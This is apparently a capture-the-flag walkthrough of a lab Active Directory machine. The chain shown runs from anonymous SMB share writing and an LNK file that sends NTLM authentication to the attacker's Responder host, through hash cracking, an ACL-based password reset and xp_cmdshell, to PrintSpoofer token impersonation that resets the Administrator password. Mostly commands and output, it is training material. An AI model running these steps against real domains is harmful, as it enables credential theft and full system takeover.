---
cover: ../.gitbook/assets/c827a7c0-1268-4756-ba38-f1a7b03808b0.jpg
coverY: 0
---

# Sharethepain(AD)

## Initial Enumeration:

### NMAP:

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-02-10 18:19:20Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hack.smarter, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hack.smarter, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.hack.smarter
| Issuer: commonName=DC01.hack.smarter
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-08T15:26:30
| Not valid after:  2026-08-10T15:26:30
| MD5:     de01 a113 1502 1f6e 3dbd c544 0c2d 5a84
| SHA-1:   3c5e d64e 5434 4a15 1fc4 443e e2d4 b98e d8a4 8350
| SHA-256: 5f95 a178 278d dc98 7d60 59cf c9e2 0c02 1a8f 94dd 84f7 11b8 3894 2a85 3f12 60a5
| rdp-ntlm-info: 
|   Target_Name: HACK
|   NetBIOS_Domain_Name: HACK
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hack.smarter
|   DNS_Computer_Name: DC01.hack.smarter
|   DNS_Tree_Name: hack.smarter
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-10T18:20:28+00:00
|_ssl-date: 2026-02-10T18:20:36+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49715/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```

## Enumerating SMB Shares:

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sharethepain]
└─$ nxc smb hack.smarter -u '' -p '' --shares                               
SMB         10.1.5.212      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:False) 
SMB         10.1.5.212      445    DC01             [+] hack.smarter\: 
SMB         10.1.5.212      445    DC01             [*] Enumerated shares
SMB         10.1.5.212      445    DC01             Share           Permissions     Remark
SMB         10.1.5.212      445    DC01             -----           -----------     ------
SMB         10.1.5.212      445    DC01             ADMIN$                          Remote Admin
SMB         10.1.5.212      445    DC01             C$                              Default share
SMB         10.1.5.212      445    DC01             IPC$                            Remote IPC
SMB         10.1.5.212      445    DC01             NETLOGON                        Logon server share 
SMB         10.1.5.212      445    DC01             Share           READ,WRITE      
SMB         10.1.5.212      445    DC01             SYSVOL                          Logon server share 

```

* We see that we have read and write permissions over the `Share`
* We will now utilize the module of netexec which is `slinky` and before doing that we will turn on our responder and this will get us the hash of a user which we can crack potentially.

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sharethepain]
└─$ nxc smb hack.smarter -u '' -p '' -M slinky -o NAME=sneaky.lnk SERVER=10.200.34.218 SHARES=Share
/home/kali/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/masky/lib/smb.py:6: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import resource_filename
[*] Ignore OPSEC in configuration is set and OPSEC unsafe module loaded
SMB         10.1.5.212      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:False) 
SMB         10.1.5.212      445    DC01             [+] hack.smarter\: 
SMB         10.1.5.212      445    DC01             [*] Enumerated shares
SMB         10.1.5.212      445    DC01             Share           Permissions     Remark
SMB         10.1.5.212      445    DC01             -----           -----------     ------
SMB         10.1.5.212      445    DC01             ADMIN$                          Remote Admin
SMB         10.1.5.212      445    DC01             C$                              Default share
SMB         10.1.5.212      445    DC01             IPC$                            Remote IPC
SMB         10.1.5.212      445    DC01             NETLOGON                        Logon server share 
SMB         10.1.5.212      445    DC01             Share           READ,WRITE      
SMB         10.1.5.212      445    DC01             SYSVOL                          Logon server share 
SLINKY      10.1.5.212      445    DC01             [+] Found writable share: Share
SLINKY      10.1.5.212      445    DC01             [+] Created LNK file on the Share share

```

* We have now captured the hash of a user and now we save it in a file named hash.txt and crack it using `hashcat` .

## Compromising Bob.ross

```python
BOB.ROSS::HACK:b315a64824d4df64:9eab09914b54f51331f2d61a8d3c26ee:010100000000000000d15119919adc017fb47ad7a29610e900000000020008004f0051003000560001001e00570049004e002d005a003900360047005a0039004a004200450046004a0004003400570049004e002d005a003900360047005a0039004a004200450046004a002e004f005100300056002e004c004f00430041004c00030014004f005100300056002e004c004f00430041004c00050014004f005100300056002e004c004f00430041004c000700080000d15119919adc01060004000200000008003000300000000000000001000000002000002d04a1c7dbf9206a6f1406e77ef08a9ece0a19ca3b296f914b037c97291e6c1a0a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00330034002e003200310038000000000000000000:
137Password123!@#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: BOB.ROSS::HACK:b315a64824d4df64:9eab09914b54f51331f...000000
Time.Started.....: Tue Feb 10 13:31:55 2026 (12 secs)
Time.Estimated...: Tue Feb 10 13:32:07 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1183.0 kH/s (1.98ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13271040/14344385 (92.52%)
Rejected.........: 0/13271040 (0.00%)
Restore.Point....: 13266944/14344385 (92.49%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 13BEBE34 -> 137951230
Hardware.Mon.#01.: Util: 69%

Started: Tue Feb 10 13:31:47 2026
Stopped: Tue Feb 10 13:32:08 2026
```

## Bloodhound:

### Collecting Bloodhound Loot:

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sharethepain]
└─$ nxc ldap dc01.hack.smarter -u bob.ross -p '137Password123!@#' --bloodhound --collect all --dns-server 10.1.5.212
LDAP        10.1.5.212      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack.smarter) (signing:None) (channel binding:No TLS cert) 
LDAP        10.1.5.212      389    DC01             [+] hack.smarter\bob.ross:137Password123!@# 
LDAP        10.1.5.212      389    DC01             Resolved collection methods: acl, trusts, dcom, psremote, objectprops, container, rdp, group, localadmin, session
LDAP        10.1.5.212      389    DC01             Done in 0M 47S
LDAP        10.1.5.212      389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.1.5.212_2026-02-10_133441_bloodhound.zip

```

### Analyzing Bloodhound Data:

<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

* We see that this user owns `alice.wonderland` and has `Genericall,WriteOwner` privileges over the user so we’ll exploit it.

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sharethepain]
└─$ net rpc password "alice.wonderland" "newP@ssword2022" -U "hack.smarter"/"bob.ross"%'137Password123!@#' -S "dc01.hack.smarter"
```

* Now we see what permissions does this user has

<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

* We see that this user is a member of `Remote Management Users` group.

## Getting User flag:

<figure><img src="../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

* Now we have got the user flag.

## Privilege Escalation:

* Upon enumerating we identified that MSSQL is running on this machine but when we did our scans it didn’t show up so it was running internally.

<figure><img src="../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

```python
*Evil-WinRM* PS C:\Users\alice.wonderland\Documents> sqlcmd -S tcp:127.0.0.1,1433 -E -Q "EXEC xp_cmdshell 'whoami /priv';"
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
NULL
PRIVILEGES INFORMATION
----------------------
NULL
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
NULL

(15 rows affected)

```

* We see that there we have `SeImpersonatePrivilege` so we can do a token impersonation and we used `printspoofer.exe` for this.

```python
┌──(kali㉿kali)-[~/Desktop/HackSmarter/sharethepain]
└─$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe                  
--2026-02-12 11:30:56--  https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
Resolving github.com (github.com)... 20.207.73.82
Connecting to github.com (github.com)|20.207.73.82|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/259576481/816ce080-f39e-11ea-8fc2-8afb7b4f4821?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-02-12T17%3A26%3A58Z&rscd=attachment%3B+filename%3DPrintSpoofer64.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-02-12T16%3A26%3A13Z&ske=2026-02-12T17%3A26%3A58Z&sks=b&skv=2018-11-09&sig=JifRtOl9EpbfUWoVfcDCp4G1ZutK9N%2Fq0YfccTSBJ0E%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3MDkxNDE1NiwibmJmIjoxNzcwOTEzODU2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.iw5CGwM14-TopAcfBExmaJvVEWu5wWI_46ez_iqeDc4&response-content-disposition=attachment%3B%20filename%3DPrintSpoofer64.exe&response-content-type=application%2Foctet-stream [following]
--2026-02-12 11:30:57--  https://release-assets.githubusercontent.com/github-production-release-asset/259576481/816ce080-f39e-11ea-8fc2-8afb7b4f4821?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-02-12T17%3A26%3A58Z&rscd=attachment%3B+filename%3DPrintSpoofer64.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-02-12T16%3A26%3A13Z&ske=2026-02-12T17%3A26%3A58Z&sks=b&skv=2018-11-09&sig=JifRtOl9EpbfUWoVfcDCp4G1ZutK9N%2Fq0YfccTSBJ0E%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3MDkxNDE1NiwibmJmIjoxNzcwOTEzODU2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.iw5CGwM14-TopAcfBExmaJvVEWu5wWI_46ez_iqeDc4&response-content-disposition=attachment%3B%20filename%3DPrintSpoofer64.exe&response-content-type=application%2Foctet-stream
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27136 (26K) [application/octet-stream]
Saving to: ‘PrintSpoofer64.exe’

PrintSpoofer64.exe                          100%[===========================================================================================>]  26.50K  --.-KB/s    in 0.002s  

2026-02-12 11:30:57 (11.5 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]

```

```python
*Evil-WinRM* PS C:\Users\alice.wonderland\Documents> cd c:\programdata
*Evil-WinRM* PS C:\programdata> upload PrintSpoofer64.exe
                                        
Info: Uploading /home/kali/Desktop/HackSmarter/sharethepain/PrintSpoofer64.exe to C:\programdata\PrintSpoofer64.exe
                                        
Data: 36180 bytes of 36180 bytes copied

```

```python
*Evil-WinRM* PS C:\programdata> Set-Content -Path c:\programdata\do.cmd -Value 'net user Administrator bluew@shere1'
*Evil-WinRM* PS C:\programdata> sqlcmd -S tcp:127.0.0.1,1433 -E -Q "EXEC xp_cmdshell 'C:\programdata\PrintSpoofer64.exe -c C:\programdata\do.cmd';"
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
NULL

(4 rows affected)

```

* We create a `do.cmd` file which had the command to change the administrator’s password to `bluew@shere1` .
* Next we exploited the privilege we had and next we can do an `evil-winrm` in the machine as Administrator and get the root flag.

<figure><img src="../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

* Now we have owned this machine and gained the root flag.
